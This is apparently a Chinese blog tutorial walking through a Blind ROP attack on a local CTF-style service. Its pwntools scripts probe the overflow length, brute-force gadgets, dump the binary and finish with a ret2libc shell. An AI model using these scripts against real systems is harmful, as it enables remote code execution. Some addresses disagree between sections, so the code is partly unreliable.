# ROP-BROP


BROP即Blind ROP。如果当题目没有给出二进制文件的时候，就得通过BROP的方式盲打。大概的思路如下：

- （确定有栈溢出的存在）通过依次增加输入数量，确定何时可以覆盖返回地址

# 确定溢出长度（padding）

脚本如下：

```python
from pwn import*
def getsize():
    i = 1
    while 1:
        try:
            p = remote('127.0.0.1',9999)
            p.recvuntil("WelCome my friend,Do you know password?\n")
            p.send(i * b'a')
            data = p.recv()
            p.close()
            if not data.startswith(b'No password'):
                return i-1
            else:
                i+=1
        except EOFError:
            p.close()
            return i-1

size = getsize()
print("size is [{}]".format(size))
```

这里减一是因为程序出错的时候以及覆盖了retn地址，但是我们只希望padding填充满rbp的位置即可。

![img](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1698912621847-add41e9a-dd23-4def-80c2-d543dee098d7.png)

结果如上，说明需要填充72个字符。

# 寻找stop_gadgets

stop_gadgets可以理解为main的地址或者__libc_start_main的地址。我们不能让payload执行完直接退出，为了多次执行，必须找到一个可以返回的地址。

```python
from pwn import *
 
length = 72
 
def getStopGadgets(length):
	addr = 0x4005b0
	while 1:
		try: 
			sh = remote('127.0.0.1',9999)
			payload = 'a'*length +p64(addr)
			sh.recvuntil("know password?\n")
			sh.sendline(payload)
			output = sh.recvuntil("password?\n")
			sh.close()
			print("one success addr 0x%x:" % (addr))
			if not output.startswith('WelCome'):
				sh.close()
				addr+=1
			else:
				return addr
		except Exception:
			addr+=1
			sh.close()
stop_gadgets = getStopGadgets(length)
```

PS：64位程序的加载地址从0x400000开始

这里得到的地址就是start（本地未跑成功，原因未知）

# 寻找brop_gadgets

```python
from pwn import *
def get_brop_gadget(length, stop_gadget, addr):
    try:
        sh = remote('127.0.0.1', 9999)
        sh.recvuntil('password?\n')
        payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(stop_gadget) + p64(0) * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        print(content)
        # stop gadget returns memory
        #if not content.startswith('WelCome'):
        #    return False
        return True
    except Exception:
        sh.close()
        return False


def check_brop_gadget(length, addr):
    try:
        sh = remote('127.0.0.1', 9999)
        sh.recvuntil('password?\n')
        payload = 'a' * length + p64(addr) + 'a' * 8 * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        return False
    except Exception:
        sh.close()
        return True


##length = getbufferflow_length()
length = 72
##get_stop_addr(length)
stop_gadget = 0x4005c0
addr = 0x400740

#######get_brop_gadgets_addr#######
while 1:
    print(hex(addr))
    if get_brop_gadget(length, stop_gadget, addr):
        print('possible brop gadget: 0x%x' % addr)
        if check_brop_gadget(length, addr):
            print('success brop gadget: 0x%x' % addr)
            break
    addr += 1
```

找到了可用的gadgets

# 寻找put地址

原理是打印出ELF头的几个字节，如果可以，就是了

```python
from pwn import *
##length = getbufferflow_length()
length = 72
##get_stop_addr(length)
stop_gadget = 0x4005c0
addr = 0x400740

def get_puts_addr(length, rdi_ret, stop_gadget):
    addr = 0x400000
    while 1:
        print hex(addr)
        sh = remote('127.0.0.1', 9999)
        sh.recvuntil('password?\n')
        payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)
        sh.sendline(payload)
        try:
            content = sh.recv()
            if content.startswith('\x7fELF'):
                print 'find puts@plt addr: 0x%x' % addr
                return addr
            sh.close()
            addr += 1
        except Exception:
            sh.close()
            addr += 1

brop_gadget=0x4007ba
rdi_ret=brop_gadget+9
get_puts_addr(72,rdi_ret,stop_gadget)
```

# dump源程序

使用发现的puts地址将程序dump下来

```python
from pwn import *
def dump(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
    sh = remote('127.0.0.1', 9999)
    payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)
    sh.recvuntil('password?\n')
    sh.sendline(payload)
    try:
        data = sh.recv()
        sh.close()
        try:
            data = data[:data.index("\nWelCome")]
        except Exception:
            data = data
        if data == "":
            data = '\x00'
        return data
    except Exception:
        sh.close()
        return None

##length = getbufferflow_length()
length = 72
##stop_gadget = get_stop_addr(length)
stop_gadget = 0x4005c0
##brop_gadget = find_brop_gadget(length,stop_gadget)
brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9
##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)
puts_plt = 0x400555
addr = 0x400000
result = ""
while addr < 0x401000:
    print hex(addr)
    data = dump(length, rdi_ret, puts_plt, addr, stop_gadget)
    if data is None:
        continue
    else:
        result += data
    addr += len(data)
with open('code', 'wb') as f:
    f.write(result)
```

# 寻找puts的GOT地址

![img](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1582370993137-ee86a9fc-9aab-44fa-a5ee-3bcfe5b9c5ff.png)

按照之前找到的puts地址，即可找到GOT表中puts的地址

# ret2libc

接下来就是ret2libc的过程

```python
##length = getbufferflow_length()
length = 72
##stop_gadget = get_stop_addr(length)
stop_gadget = 0x4006b6
##brop_gadget = find_brop_gadget(length,stop_gadget)
brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9
##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)
puts_plt = 0x400560
##leakfunction(length, rdi_ret, puts_plt, stop_gadget)
puts_got = 0x601018

sh = remote('127.0.0.1', 9999)
sh.recvuntil('password?\n')
payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)
sh.sendline(payload)
data = sh.recvuntil('\nWelCome', drop=True)
puts_addr = u64(data.ljust(8, '\x00'))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)
sh.sendline(payload)
sh.interactive()
```


---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/11/rop-brop/  

